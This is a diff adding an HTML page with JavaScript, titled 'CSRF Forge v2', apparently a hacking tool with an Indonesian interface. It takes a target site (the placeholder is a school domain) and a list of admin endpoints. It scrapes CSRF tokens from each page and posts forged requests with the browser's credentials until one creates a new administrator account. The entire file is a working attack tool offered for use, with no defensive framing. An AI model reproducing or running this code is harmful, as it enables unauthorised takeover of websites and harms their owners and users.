@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>CSRF Forge v2</title>
+<style>
+  body{background:#0d0d0d;color:#eaeaea;font-family:Arial,sans-serif;margin:0;padding:30px;}
+  .box{max-width:640px;margin:auto;background:#151515;border:1px solid #222;border-radius:10px;padding:24px;}
+  h1{color:#00ff88;text-align:center;font-size:20px;margin:0 0 4px;}
+  p.sub{color:#666;text-align:center;font-size:12px;margin:0 0 20px;}
+  label{display:block;color:#aaa;font-size:12px;margin:10px 0 4px;}
+  input{width:100%;padding:9px;background:#0d0d0d;border:1px solid #2a2a2a;color:#eee;border-radius:5px;box-sizing:border-box;}
+  input:focus{outline:none;border-color:#00ff88;}
+  button{width:100%;padding:11px;background:#00ff88;color:#000;border:none;border-radius:5px;font-weight:bold;margin-top:14px;cursor:pointer;}
+  button:hover{background:#00cc6a;}
+  #log{background:#000;color:#00ff88;font-family:monospace;font-size:12px;padding:10px;border-radius:6px;height:160px;overflow-y:auto;margin-top:14px;white-space:pre-wrap;}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>CSRF FORGE v2</h1>
+  <p class="sub">Mr-Kenzz terminal - Adaptive Admin Creator</p>
+
+  <label>URL TARGET</label>
+  <input id="target" placeholder="https://target.sch.id" value="">
+
+  <label>ENDPOINT (pisah koma)</label>
+  <input id="endpoint" value="/admin/simpanpetugas.php,/admin/tambah_admin.php,/admin/add_user.php,/api/admin/create">
+
+  <label>NAMA</label>
+  <input id="nama" value="Petugas">
+
+  <label>USERNAME</label>
+  <input id="username" value="">
+
+  <label>PASSWORD</label>
+  <input id="pass" value="">
+
+  <label>LEVEL / ROLE</label>
+  <input id="role" value="admin">
+
+  <button onclick="forge()">GAS FORGE</button>
+  <div id="log">[ready]</div>
+</div>
+
+<script>
+var logEl = document.getElementById('log');
+function log(m){
+  var t = new Date().toLocaleTimeString();
+  logEl.textContent += '\n[' + t + '] ' + m;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+async function getCsrf(url){
+  try{
+    var r = await fetch(url,{credentials:'include'});
+    var h = await r.text();
+    var pats = [
+      [/name=["']csrf_token["']\s+value=["']([^"']+)["']/i,'csrf_token'],
+      [/name=["']csrfmiddlewaretoken["']\s+value=["']([^"']+)["']/i,'csrfmiddlewaretoken'],
+      [/name=["']_token["']\s+value=["']([^"']+)["']/i,'_token'],
+      [/name=["']token["']\s+value=["']([^"']+)["']/i,'token']
+    ];
+    for(var i=0;i<pats.length;i++){
+      var m = h.match(pats[i][0]);
+      if(m) return {token:m[1],field:pats[i][1]};
+    }
+    return null;
+  }catch(e){ log('csrf err: '+e.message); return null; }
+}
+
+async function forge(){
+  logEl.textContent = '[forge started]';
+  var base = document.getElementById('target').value.trim().replace(/\/$/,'');
+  if(!base){ log('URL target kosong'); return; }
+  var eps = document.getElementById('endpoint').value.split(',').map(function(s){return s.trim();}).filter(Boolean);
+  var nama = document.getElementById('nama').value.trim();
+  var user = document.getElementById('username').value.trim();
+  var pw   = document.getElementById('pass').value.trim();
+  var role = document.getElementById('role').value.trim();
+
+  for(var i=0;i<eps.length;i++){
+    var url = base + eps[i];
+    log('probe: '+url);
+
+    var csrf = await getCsrf(url);
+    if(csrf) log('csrf: '+csrf.token.slice(0,12)+'...');
+    else log('no csrf, kirim tanpa token');
+
+    var f = {
+      nama:nama, name:nama,
+      username:user, user:user,
+      pass:pw, password:pw,
+      level:role, role:role, hak_akses:role
+    };
+    if(csrf) f[csrf.field] = csrf.token;
+
+    var body = new URLSearchParams(f).toString();
+
+    try{
+      var t0 = performance.now();
+      var r = await fetch(url,{
+        method:'POST',
+        credentials:'include',
+        headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
+        body:body
+      });
+      var t1 = Math.round(performance.now()-t0);
+      var txt = await r.text();
+      log('status:'+r.status+' | '+t1+'ms | len:'+txt.length);
+      if(r.status>=200 && r.status<400){
+        log('>>> KANDIDAT BERHASIL: '+url);
+        return;
+      }
+    }catch(e){ log('err: '+e.message); }
+  }
+  log('selesai. cek panel manual.');
+}
+</script>
+</body>
+</html>
